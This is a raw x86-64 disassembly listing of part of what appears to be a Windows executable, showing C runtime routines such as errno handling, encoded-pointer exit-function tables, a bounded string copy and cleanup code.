   140004864:	e8 5b ff ff ff       	call   0x1400047c4
   140004869:	48 83 c4 28          	add    $0x28,%rsp
   14000486d:	c3                   	ret
   14000486e:	cc                   	int3
   14000486f:	cc                   	int3
   140004870:	40 53                	rex push %rbx
   140004872:	48 83 ec 20          	sub    $0x20,%rsp
   140004876:	8b d9                	mov    %ecx,%ebx
   140004878:	e8 37 0b 00 00       	call   0x1400053b4
   14000487d:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140004884:	41 8b d0             	mov    %r8d,%edx
   140004887:	80 e2 02             	and    $0x2,%dl
   14000488a:	f6 da                	neg    %dl
   14000488c:	1b c9                	sbb    %ecx,%ecx
   14000488e:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004891:	74 36                	je     0x1400048c9
   140004893:	85 db                	test   %ebx,%ebx
   140004895:	74 39                	je     0x1400048d0
   140004897:	83 fb 01             	cmp    $0x1,%ebx
   14000489a:	74 20                	je     0x1400048bc
   14000489c:	83 fb 02             	cmp    $0x2,%ebx
   14000489f:	74 15                	je     0x1400048b6
   1400048a1:	e8 ea 10 00 00       	call   0x140005990
   1400048a6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400048ac:	e8 bf 0f 00 00       	call   0x140005870
   1400048b1:	83 c8 ff             	or     $0xffffffff,%eax
   1400048b4:	eb 1d                	jmp    0x1400048d3
   1400048b6:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   1400048ba:	eb 04                	jmp    0x1400048c0
   1400048bc:	41 83 c8 02          	or     $0x2,%r8d
   1400048c0:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   1400048c7:	eb 07                	jmp    0x1400048d0
   1400048c9:	83 0d e0 2e 01 00 ff 	orl    $0xffffffff,0x12ee0(%rip)        # 0x1400177b0
   1400048d0:	8d 41 02             	lea    0x2(%rcx),%eax
   1400048d3:	48 83 c4 20          	add    $0x20,%rsp
   1400048d7:	5b                   	pop    %rbx
   1400048d8:	c3                   	ret
   1400048d9:	cc                   	int3
   1400048da:	cc                   	int3
   1400048db:	cc                   	int3
   1400048dc:	8b 05 5e 3a 01 00    	mov    0x13a5e(%rip),%eax        # 0x140018340
   1400048e2:	c3                   	ret
   1400048e3:	cc                   	int3
   1400048e4:	48 83 ec 28          	sub    $0x28,%rsp
   1400048e8:	83 f9 01             	cmp    $0x1,%ecx
   1400048eb:	76 15                	jbe    0x140004902
   1400048ed:	e8 9e 10 00 00       	call   0x140005990
   1400048f2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400048f8:	e8 73 0f 00 00       	call   0x140005870
   1400048fd:	83 c8 ff             	or     $0xffffffff,%eax
   140004900:	eb 08                	jmp    0x14000490a
   140004902:	87 0d 38 3a 01 00    	xchg   %ecx,0x13a38(%rip)        # 0x140018340
   140004908:	8b c1                	mov    %ecx,%eax
   14000490a:	48 83 c4 28          	add    $0x28,%rsp
   14000490e:	c3                   	ret
   14000490f:	cc                   	int3
   140004910:	48 8d 05 2d 3a 01 00 	lea    0x13a2d(%rip),%rax        # 0x140018344
   140004917:	c3                   	ret
   140004918:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   14000491f:	00 
   140004920:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140004924:	e9 47 18 00 00       	jmp    0x140006170
   140004929:	cc                   	int3
   14000492a:	cc                   	int3
   14000492b:	cc                   	int3
   14000492c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004931:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004936:	57                   	push   %rdi
   140004937:	48 83 ec 20          	sub    $0x20,%rsp
   14000493b:	49 8b d9             	mov    %r9,%rbx
   14000493e:	49 8b f8             	mov    %r8,%rdi
   140004941:	8b 0a                	mov    (%rdx),%ecx
   140004943:	e8 e0 16 00 00       	call   0x140006028
   140004948:	90                   	nop
   140004949:	48 8b cf             	mov    %rdi,%rcx
   14000494c:	e8 53 00 00 00       	call   0x1400049a4
   140004951:	8b f8                	mov    %eax,%edi
   140004953:	8b 0b                	mov    (%rbx),%ecx
   140004955:	e8 22 17 00 00       	call   0x14000607c
   14000495a:	8b c7                	mov    %edi,%eax
   14000495c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004961:	48 83 c4 20          	add    $0x20,%rsp
   140004965:	5f                   	pop    %rdi
   140004966:	c3                   	ret
   140004967:	cc                   	int3
   140004968:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000496d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004972:	57                   	push   %rdi
   140004973:	48 83 ec 20          	sub    $0x20,%rsp
   140004977:	49 8b d9             	mov    %r9,%rbx
   14000497a:	49 8b f8             	mov    %r8,%rdi
   14000497d:	8b 0a                	mov    (%rdx),%ecx
   14000497f:	e8 a4 16 00 00       	call   0x140006028
   140004984:	90                   	nop
   140004985:	48 8b cf             	mov    %rdi,%rcx
   140004988:	e8 c7 01 00 00       	call   0x140004b54
   14000498d:	8b f8                	mov    %eax,%edi
   14000498f:	8b 0b                	mov    (%rbx),%ecx
   140004991:	e8 e6 16 00 00       	call   0x14000607c
   140004996:	8b c7                	mov    %edi,%eax
   140004998:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000499d:	48 83 c4 20          	add    $0x20,%rsp
   1400049a1:	5f                   	pop    %rdi
   1400049a2:	c3                   	ret
   1400049a3:	cc                   	int3
   1400049a4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400049a9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400049ae:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400049b3:	57                   	push   %rdi
   1400049b4:	41 56                	push   %r14
   1400049b6:	41 57                	push   %r15
   1400049b8:	48 83 ec 20          	sub    $0x20,%rsp
   1400049bc:	48 8b 01             	mov    (%rcx),%rax
   1400049bf:	33 ed                	xor    %ebp,%ebp
   1400049c1:	4c 8b f9             	mov    %rcx,%r15
   1400049c4:	48 8b 18             	mov    (%rax),%rbx
   1400049c7:	48 85 db             	test   %rbx,%rbx
   1400049ca:	0f 84 68 01 00 00    	je     0x140004b38
   1400049d0:	4c 8b 15 29 26 01 00 	mov    0x12629(%rip),%r10        # 0x140017000
   1400049d7:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   1400049db:	49 8b f2             	mov    %r10,%rsi
   1400049de:	48 33 33             	xor    (%rbx),%rsi
   1400049e1:	4d 33 ca             	xor    %r10,%r9
   1400049e4:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400049e8:	41 8b ca             	mov    %r10d,%ecx
   1400049eb:	83 e1 3f             	and    $0x3f,%ecx
   1400049ee:	49 33 da             	xor    %r10,%rbx
   1400049f1:	48 d3 cb             	ror    %cl,%rbx
   1400049f4:	48 d3 ce             	ror    %cl,%rsi
   1400049f7:	49 d3 c9             	ror    %cl,%r9
   1400049fa:	4c 3b cb             	cmp    %rbx,%r9
   1400049fd:	0f 85 a7 00 00 00    	jne    0x140004aaa
   140004a03:	48 2b de             	sub    %rsi,%rbx
   140004a06:	b8 00 02 00 00       	mov    $0x200,%eax
   140004a0b:	48 c1 fb 03          	sar    $0x3,%rbx
   140004a0f:	48 3b d8             	cmp    %rax,%rbx
   140004a12:	48 8b fb             	mov    %rbx,%rdi
   140004a15:	48 0f 47 f8          	cmova  %rax,%rdi
   140004a19:	8d 45 20             	lea    0x20(%rbp),%eax
   140004a1c:	48 03 fb             	add    %rbx,%rdi
   140004a1f:	48 0f 44 f8          	cmove  %rax,%rdi
   140004a23:	48 3b fb             	cmp    %rbx,%rdi
   140004a26:	72 1e                	jb     0x140004a46
   140004a28:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   140004a2c:	48 8b d7             	mov    %rdi,%rdx
   140004a2f:	48 8b ce             	mov    %rsi,%rcx
   140004a32:	e8 fd 3e 00 00       	call   0x140008934
   140004a37:	33 c9                	xor    %ecx,%ecx
   140004a39:	4c 8b f0             	mov    %rax,%r14
   140004a3c:	e8 2f 17 00 00       	call   0x140006170
   140004a41:	4d 85 f6             	test   %r14,%r14
   140004a44:	75 28                	jne    0x140004a6e
   140004a46:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   140004a4a:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004a50:	48 8b d7             	mov    %rdi,%rdx
   140004a53:	48 8b ce             	mov    %rsi,%rcx
   140004a56:	e8 d9 3e 00 00       	call   0x140008934
   140004a5b:	33 c9                	xor    %ecx,%ecx
   140004a5d:	4c 8b f0             	mov    %rax,%r14
   140004a60:	e8 0b 17 00 00       	call   0x140006170
   140004a65:	4d 85 f6             	test   %r14,%r14
   140004a68:	0f 84 ca 00 00 00    	je     0x140004b38
   140004a6e:	4c 8b 15 8b 25 01 00 	mov    0x1258b(%rip),%r10        # 0x140017000
   140004a75:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   140004a79:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   140004a7d:	49 8b f6             	mov    %r14,%rsi
   140004a80:	48 8b cb             	mov    %rbx,%rcx
   140004a83:	49 2b c9             	sub    %r9,%rcx
   140004a86:	48 83 c1 07          	add    $0x7,%rcx
   140004a8a:	48 c1 e9 03          	shr    $0x3,%rcx
   140004a8e:	4c 3b cb             	cmp    %rbx,%r9
   140004a91:	48 0f 47 cd          	cmova  %rbp,%rcx
   140004a95:	48 85 c9             	test   %rcx,%rcx
   140004a98:	74 10                	je     0x140004aaa
   140004a9a:	49 8b c2             	mov    %r10,%rax
   140004a9d:	49 8b f9             	mov    %r9,%rdi
   140004aa0:	f3 48 ab             	rep stos %rax,(%rdi)
   140004aa3:	4c 8b 15 56 25 01 00 	mov    0x12556(%rip),%r10        # 0x140017000
   140004aaa:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004ab0:	49 8d 79 08          	lea    0x8(%r9),%rdi
   140004ab4:	41 8b c8             	mov    %r8d,%ecx
   140004ab7:	41 8b c2             	mov    %r10d,%eax
   140004aba:	83 e0 3f             	and    $0x3f,%eax
   140004abd:	2b c8                	sub    %eax,%ecx
   140004abf:	49 8b 47 08          	mov    0x8(%r15),%rax
   140004ac3:	48 8b 10             	mov    (%rax),%rdx
   140004ac6:	41 8b c0             	mov    %r8d,%eax
   140004ac9:	48 d3 ca             	ror    %cl,%rdx
   140004acc:	49 33 d2             	xor    %r10,%rdx
   140004acf:	49 89 11             	mov    %rdx,(%r9)
   140004ad2:	48 8b 15 27 25 01 00 	mov    0x12527(%rip),%rdx        # 0x140017000
   140004ad9:	8b ca                	mov    %edx,%ecx
   140004adb:	83 e1 3f             	and    $0x3f,%ecx
   140004ade:	2b c1                	sub    %ecx,%eax
   140004ae0:	8a c8                	mov    %al,%cl
   140004ae2:	49 8b 07             	mov    (%r15),%rax
   140004ae5:	48 d3 ce             	ror    %cl,%rsi
   140004ae8:	48 33 f2             	xor    %rdx,%rsi
   140004aeb:	48 8b 08             	mov    (%rax),%rcx
   140004aee:	48 89 31             	mov    %rsi,(%rcx)
   140004af1:	41 8b c8             	mov    %r8d,%ecx
   140004af4:	48 8b 15 05 25 01 00 	mov    0x12505(%rip),%rdx        # 0x140017000
   140004afb:	8b c2                	mov    %edx,%eax
   140004afd:	83 e0 3f             	and    $0x3f,%eax
   140004b00:	2b c8                	sub    %eax,%ecx
   140004b02:	49 8b 07             	mov    (%r15),%rax
   140004b05:	48 d3 cf             	ror    %cl,%rdi
   140004b08:	48 33 fa             	xor    %rdx,%rdi
   140004b0b:	48 8b 10             	mov    (%rax),%rdx
   140004b0e:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   140004b12:	48 8b 15 e7 24 01 00 	mov    0x124e7(%rip),%rdx        # 0x140017000
   140004b19:	8b c2                	mov    %edx,%eax
   140004b1b:	83 e0 3f             	and    $0x3f,%eax
   140004b1e:	44 2b c0             	sub    %eax,%r8d
   140004b21:	49 8b 07             	mov    (%r15),%rax
   140004b24:	41 8a c8             	mov    %r8b,%cl
   140004b27:	48 d3 cb             	ror    %cl,%rbx
   140004b2a:	48 33 da             	xor    %rdx,%rbx
   140004b2d:	48 8b 08             	mov    (%rax),%rcx
   140004b30:	33 c0                	xor    %eax,%eax
   140004b32:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140004b36:	eb 03                	jmp    0x140004b3b
   140004b38:	83 c8 ff             	or     $0xffffffff,%eax
   140004b3b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140004b40:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140004b45:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004b4a:	48 83 c4 20          	add    $0x20,%rsp
   140004b4e:	41 5f                	pop    %r15
   140004b50:	41 5e                	pop    %r14
   140004b52:	5f                   	pop    %rdi
   140004b53:	c3                   	ret
   140004b54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b59:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004b5e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004b63:	57                   	push   %rdi
   140004b64:	41 56                	push   %r14
   140004b66:	41 57                	push   %r15
   140004b68:	48 83 ec 20          	sub    $0x20,%rsp
   140004b6c:	48 8b 01             	mov    (%rcx),%rax
   140004b6f:	48 8b f1             	mov    %rcx,%rsi
   140004b72:	48 8b 18             	mov    (%rax),%rbx
   140004b75:	48 85 db             	test   %rbx,%rbx
   140004b78:	75 08                	jne    0x140004b82
   140004b7a:	83 c8 ff             	or     $0xffffffff,%eax
   140004b7d:	e9 cf 00 00 00       	jmp    0x140004c51
   140004b82:	4c 8b 05 77 24 01 00 	mov    0x12477(%rip),%r8        # 0x140017000
   140004b89:	41 8b c8             	mov    %r8d,%ecx
   140004b8c:	49 8b f8             	mov    %r8,%rdi
   140004b8f:	48 33 3b             	xor    (%rbx),%rdi
   140004b92:	83 e1 3f             	and    $0x3f,%ecx
   140004b95:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140004b99:	48 d3 cf             	ror    %cl,%rdi
   140004b9c:	49 33 d8             	xor    %r8,%rbx
   140004b9f:	48 d3 cb             	ror    %cl,%rbx
   140004ba2:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140004ba6:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140004baa:	0f 87 9f 00 00 00    	ja     0x140004c4f
   140004bb0:	41 8b c8             	mov    %r8d,%ecx
   140004bb3:	4d 8b f0             	mov    %r8,%r14
   140004bb6:	83 e1 3f             	and    $0x3f,%ecx
   140004bb9:	4c 8b ff             	mov    %rdi,%r15
   140004bbc:	48 8b eb             	mov    %rbx,%rbp
   140004bbf:	48 83 eb 08          	sub    $0x8,%rbx
   140004bc3:	48 3b df             	cmp    %rdi,%rbx
   140004bc6:	72 55                	jb     0x140004c1d
   140004bc8:	48 8b 03             	mov    (%rbx),%rax
   140004bcb:	49 3b c6             	cmp    %r14,%rax
   140004bce:	74 ef                	je     0x140004bbf
   140004bd0:	49 33 c0             	xor    %r8,%rax
   140004bd3:	4c 89 33             	mov    %r14,(%rbx)
   140004bd6:	48 d3 c8             	ror    %cl,%rax
   140004bd9:	ff 15 a9 86 00 00    	call   *0x86a9(%rip)        # 0x14000d288
   140004bdf:	4c 8b 05 1a 24 01 00 	mov    0x1241a(%rip),%r8        # 0x140017000
   140004be6:	48 8b 06             	mov    (%rsi),%rax
   140004be9:	41 8b c8             	mov    %r8d,%ecx
   140004bec:	83 e1 3f             	and    $0x3f,%ecx
   140004bef:	48 8b 10             	mov    (%rax),%rdx
   140004bf2:	4c 8b 0a             	mov    (%rdx),%r9
   140004bf5:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140004bf9:	4d 33 c8             	xor    %r8,%r9
   140004bfc:	49 33 c0             	xor    %r8,%rax
   140004bff:	49 d3 c9             	ror    %cl,%r9
   140004c02:	48 d3 c8             	ror    %cl,%rax
   140004c05:	4d 3b cf             	cmp    %r15,%r9
   140004c08:	75 05                	jne    0x140004c0f
   140004c0a:	48 3b c5             	cmp    %rbp,%rax
   140004c0d:	74 b0                	je     0x140004bbf
   140004c0f:	4d 8b f9             	mov    %r9,%r15
   140004c12:	49 8b f9             	mov    %r9,%rdi
   140004c15:	48 8b e8             	mov    %rax,%rbp
   140004c18:	48 8b d8             	mov    %rax,%rbx
   140004c1b:	eb a2                	jmp    0x140004bbf
   140004c1d:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140004c21:	74 0f                	je     0x140004c32
   140004c23:	48 8b cf             	mov    %rdi,%rcx
   140004c26:	e8 45 15 00 00       	call   0x140006170
   140004c2b:	4c 8b 05 ce 23 01 00 	mov    0x123ce(%rip),%r8        # 0x140017000
   140004c32:	48 8b 06             	mov    (%rsi),%rax
   140004c35:	48 8b 08             	mov    (%rax),%rcx
   140004c38:	4c 89 01             	mov    %r8,(%rcx)
   140004c3b:	48 8b 06             	mov    (%rsi),%rax
   140004c3e:	48 8b 08             	mov    (%rax),%rcx
   140004c41:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140004c45:	48 8b 06             	mov    (%rsi),%rax
   140004c48:	48 8b 08             	mov    (%rax),%rcx
   140004c4b:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140004c4f:	33 c0                	xor    %eax,%eax
   140004c51:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004c56:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004c5b:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004c60:	48 83 c4 20          	add    $0x20,%rsp
   140004c64:	41 5f                	pop    %r15
   140004c66:	41 5e                	pop    %r14
   140004c68:	5f                   	pop    %rdi
   140004c69:	c3                   	ret
   140004c6a:	cc                   	int3
   140004c6b:	cc                   	int3
   140004c6c:	48 8b d1             	mov    %rcx,%rdx
   140004c6f:	48 8d 0d d2 36 01 00 	lea    0x136d2(%rip),%rcx        # 0x140018348
   140004c76:	e9 65 00 00 00       	jmp    0x140004ce0
   140004c7b:	cc                   	int3
   140004c7c:	4c 8b dc             	mov    %rsp,%r11
   140004c7f:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140004c83:	48 83 ec 38          	sub    $0x38,%rsp
   140004c87:	49 8d 43 08          	lea    0x8(%r11),%rax
   140004c8b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140004c8f:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140004c93:	b8 02 00 00 00       	mov    $0x2,%eax
   140004c98:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140004c9c:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140004ca0:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140004ca4:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   140004ca8:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140004cac:	e8 b7 fc ff ff       	call   0x140004968
   140004cb1:	48 83 c4 38          	add    $0x38,%rsp
   140004cb5:	c3                   	ret
   140004cb6:	cc                   	int3
   140004cb7:	cc                   	int3
   140004cb8:	48 85 c9             	test   %rcx,%rcx
   140004cbb:	75 04                	jne    0x140004cc1
   140004cbd:	83 c8 ff             	or     $0xffffffff,%eax
   140004cc0:	c3                   	ret
   140004cc1:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140004cc5:	48 39 01             	cmp    %rax,(%rcx)
   140004cc8:	75 12                	jne    0x140004cdc
   140004cca:	48 8b 05 2f 23 01 00 	mov    0x1232f(%rip),%rax        # 0x140017000
   140004cd1:	48 89 01             	mov    %rax,(%rcx)
   140004cd4:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004cd8:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140004cdc:	33 c0                	xor    %eax,%eax
   140004cde:	c3                   	ret
   140004cdf:	cc                   	int3
   140004ce0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004ce5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004cea:	55                   	push   %rbp
   140004ceb:	48 8b ec             	mov    %rsp,%rbp
   140004cee:	48 83 ec 40          	sub    $0x40,%rsp
   140004cf2:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004cf6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004cfa:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140004cfe:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140004d02:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004d06:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004d0a:	b8 02 00 00 00       	mov    $0x2,%eax
   140004d0f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004d13:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140004d17:	89 45 28             	mov    %eax,0x28(%rbp)
   140004d1a:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140004d1d:	e8 0a fc ff ff       	call   0x14000492c
   140004d22:	48 83 c4 40          	add    $0x40,%rsp
   140004d26:	5d                   	pop    %rbp
   140004d27:	c3                   	ret
   140004d28:	48 8d 05 31 23 01 00 	lea    0x12331(%rip),%rax        # 0x140017060
   140004d2f:	48 89 05 fa 37 01 00 	mov    %rax,0x137fa(%rip)        # 0x140018530
   140004d36:	b0 01                	mov    $0x1,%al
   140004d38:	c3                   	ret
   140004d39:	cc                   	int3
   140004d3a:	cc                   	int3
   140004d3b:	cc                   	int3
   140004d3c:	48 83 ec 28          	sub    $0x28,%rsp
   140004d40:	48 8d 0d 01 36 01 00 	lea    0x13601(%rip),%rcx        # 0x140018348
   140004d47:	e8 6c ff ff ff       	call   0x140004cb8
   140004d4c:	48 8d 0d 0d 36 01 00 	lea    0x1360d(%rip),%rcx        # 0x140018360
   140004d53:	e8 60 ff ff ff       	call   0x140004cb8
   140004d58:	b0 01                	mov    $0x1,%al
   140004d5a:	48 83 c4 28          	add    $0x28,%rsp
   140004d5e:	c3                   	ret
   140004d5f:	cc                   	int3
   140004d60:	48 83 ec 28          	sub    $0x28,%rsp
   140004d64:	e8 df f5 ff ff       	call   0x140004348
   140004d69:	b0 01                	mov    $0x1,%al
   140004d6b:	48 83 c4 28          	add    $0x28,%rsp
   140004d6f:	c3                   	ret
   140004d70:	40 53                	rex push %rbx
   140004d72:	48 83 ec 20          	sub    $0x20,%rsp
   140004d76:	48 8b 1d 83 22 01 00 	mov    0x12283(%rip),%rbx        # 0x140017000
   140004d7d:	48 8b cb             	mov    %rbx,%rcx
   140004d80:	e8 33 0a 00 00       	call   0x1400057b8
   140004d85:	48 8b cb             	mov    %rbx,%rcx
   140004d88:	e8 9b ed ff ff       	call   0x140003b28
   140004d8d:	48 8b cb             	mov    %rbx,%rcx
   140004d90:	e8 93 3d 00 00       	call   0x140008b28
   140004d95:	48 8b cb             	mov    %rbx,%rcx
   140004d98:	e8 b3 ef ff ff       	call   0x140003d50
   140004d9d:	48 8b cb             	mov    %rbx,%rcx
   140004da0:	e8 63 f9 ff ff       	call   0x140004708
   140004da5:	b0 01                	mov    $0x1,%al
   140004da7:	48 83 c4 20          	add    $0x20,%rsp
   140004dab:	5b                   	pop    %rbx
   140004dac:	c3                   	ret
   140004dad:	cc                   	int3
   140004dae:	cc                   	int3
   140004daf:	cc                   	int3
   140004db0:	33 c9                	xor    %ecx,%ecx
   140004db2:	e9 81 da ff ff       	jmp    0x140002838
   140004db7:	cc                   	int3
   140004db8:	40 53                	rex push %rbx
   140004dba:	48 83 ec 20          	sub    $0x20,%rsp
   140004dbe:	48 8b 0d c3 39 01 00 	mov    0x139c3(%rip),%rcx        # 0x140018788
   140004dc5:	83 c8 ff             	or     $0xffffffff,%eax
   140004dc8:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140004dcc:	83 f8 01             	cmp    $0x1,%eax
   140004dcf:	75 1f                	jne    0x140004df0
   140004dd1:	48 8b 0d b0 39 01 00 	mov    0x139b0(%rip),%rcx        # 0x140018788
   140004dd8:	48 8d 1d f1 23 01 00 	lea    0x123f1(%rip),%rbx        # 0x1400171d0
   140004ddf:	48 3b cb             	cmp    %rbx,%rcx
   140004de2:	74 0c                	je     0x140004df0
   140004de4:	e8 87 13 00 00       	call   0x140006170
   140004de9:	48 89 1d 98 39 01 00 	mov    %rbx,0x13998(%rip)        # 0x140018788
   140004df0:	b0 01                	mov    $0x1,%al
   140004df2:	48 83 c4 20          	add    $0x20,%rsp
   140004df6:	5b                   	pop    %rbx
   140004df7:	c3                   	ret
   140004df8:	48 83 ec 28          	sub    $0x28,%rsp
   140004dfc:	48 8b 0d 15 3e 01 00 	mov    0x13e15(%rip),%rcx        # 0x140018c18
   140004e03:	e8 68 13 00 00       	call   0x140006170
   140004e08:	48 8b 0d 11 3e 01 00 	mov    0x13e11(%rip),%rcx        # 0x140018c20
   140004e0f:	48 83 25 01 3e 01 00 	andq   $0x0,0x13e01(%rip)        # 0x140018c18
   140004e16:	00 
   140004e17:	e8 54 13 00 00       	call   0x140006170
   140004e1c:	48 8b 0d 85 39 01 00 	mov    0x13985(%rip),%rcx        # 0x1400187a8
   140004e23:	48 83 25 f5 3d 01 00 	andq   $0x0,0x13df5(%rip)        # 0x140018c20
   140004e2a:	00 
   140004e2b:	e8 40 13 00 00       	call   0x140006170
   140004e30:	48 8b 0d 79 39 01 00 	mov    0x13979(%rip),%rcx        # 0x1400187b0
   140004e37:	48 83 25 69 39 01 00 	andq   $0x0,0x13969(%rip)        # 0x1400187a8
   140004e3e:	00 
   140004e3f:	e8 2c 13 00 00       	call   0x140006170
   140004e44:	48 83 25 64 39 01 00 	andq   $0x0,0x13964(%rip)        # 0x1400187b0
   140004e4b:	00 
   140004e4c:	b0 01                	mov    $0x1,%al
   140004e4e:	48 83 c4 28          	add    $0x28,%rsp
   140004e52:	c3                   	ret
   140004e53:	cc                   	int3
   140004e54:	48 8d 15 e5 96 00 00 	lea    0x96e5(%rip),%rdx        # 0x14000e540
   140004e5b:	48 8d 0d de 95 00 00 	lea    0x95de(%rip),%rcx        # 0x14000e440
   140004e62:	e9 8d 3b 00 00       	jmp    0x1400089f4
   140004e67:	cc                   	int3
   140004e68:	48 83 ec 28          	sub    $0x28,%rsp
   140004e6c:	84 c9                	test   %cl,%cl
   140004e6e:	74 16                	je     0x140004e86
   140004e70:	48 83 3d 98 3d 01 00 	cmpq   $0x0,0x13d98(%rip)        # 0x140018c10
   140004e77:	00 
   140004e78:	74 05                	je     0x140004e7f
   140004e7a:	e8 d9 41 00 00       	call   0x140009058
   140004e7f:	b0 01                	mov    $0x1,%al
   140004e81:	48 83 c4 28          	add    $0x28,%rsp
   140004e85:	c3                   	ret
   140004e86:	48 8d 15 b3 96 00 00 	lea    0x96b3(%rip),%rdx        # 0x14000e540
   140004e8d:	48 8d 0d ac 95 00 00 	lea    0x95ac(%rip),%rcx        # 0x14000e440
   140004e94:	48 83 c4 28          	add    $0x28,%rsp
   140004e98:	e9 d7 3b 00 00       	jmp    0x140008a74
   140004e9d:	cc                   	int3
   140004e9e:	cc                   	int3
   140004e9f:	cc                   	int3
   140004ea0:	48 83 ec 28          	sub    $0x28,%rsp
   140004ea4:	e8 0b 05 00 00       	call   0x1400053b4
   140004ea9:	48 8b 40 18          	mov    0x18(%rax),%rax
   140004ead:	48 85 c0             	test   %rax,%rax
   140004eb0:	74 08                	je     0x140004eba
   140004eb2:	ff 15 d0 83 00 00    	call   *0x83d0(%rip)        # 0x14000d288
   140004eb8:	eb 00                	jmp    0x140004eba
   140004eba:	e8 61 00 00 00       	call   0x140004f20
   140004ebf:	90                   	nop
   140004ec0:	40 53                	rex push %rbx
   140004ec2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ec6:	33 db                	xor    %ebx,%ebx
   140004ec8:	48 85 c9             	test   %rcx,%rcx
   140004ecb:	74 0c                	je     0x140004ed9
   140004ecd:	48 85 d2             	test   %rdx,%rdx
   140004ed0:	74 07                	je     0x140004ed9
   140004ed2:	4d 85 c0             	test   %r8,%r8
   140004ed5:	75 1b                	jne    0x140004ef2
   140004ed7:	88 19                	mov    %bl,(%rcx)
   140004ed9:	e8 b2 0a 00 00       	call   0x140005990
   140004ede:	bb 16 00 00 00       	mov    $0x16,%ebx
   140004ee3:	89 18                	mov    %ebx,(%rax)
   140004ee5:	e8 86 09 00 00       	call   0x140005870
   140004eea:	8b c3                	mov    %ebx,%eax
   140004eec:	48 83 c4 20          	add    $0x20,%rsp
   140004ef0:	5b                   	pop    %rbx
   140004ef1:	c3                   	ret
   140004ef2:	4c 8b c9             	mov    %rcx,%r9
   140004ef5:	4c 2b c1             	sub    %rcx,%r8
   140004ef8:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   140004efc:	41 88 01             	mov    %al,(%r9)
   140004eff:	49 ff c1             	inc    %r9
   140004f02:	84 c0                	test   %al,%al
   140004f04:	74 06                	je     0x140004f0c
   140004f06:	48 83 ea 01          	sub    $0x1,%rdx
   140004f0a:	75 ec                	jne    0x140004ef8
   140004f0c:	48 85 d2             	test   %rdx,%rdx
   140004f0f:	75 d9                	jne    0x140004eea
   140004f11:	88 19                	mov    %bl,(%rcx)
   140004f13:	e8 78 0a 00 00       	call   0x140005990
   140004f18:	bb 22 00 00 00       	mov    $0x22,%ebx
   140004f1d:	eb c4                	jmp    0x140004ee3
   140004f1f:	cc                   	int3
   140004f20:	48 83 ec 28          	sub    $0x28,%rsp
   140004f24:	e8 cf 3b 00 00       	call   0x140008af8
   140004f29:	48 85 c0             	test   %rax,%rax
   140004f2c:	74 0a                	je     0x140004f38
   140004f2e:	b9 16 00 00 00       	mov    $0x16,%ecx
   140004f33:	e8 10 3c 00 00       	call   0x140008b48
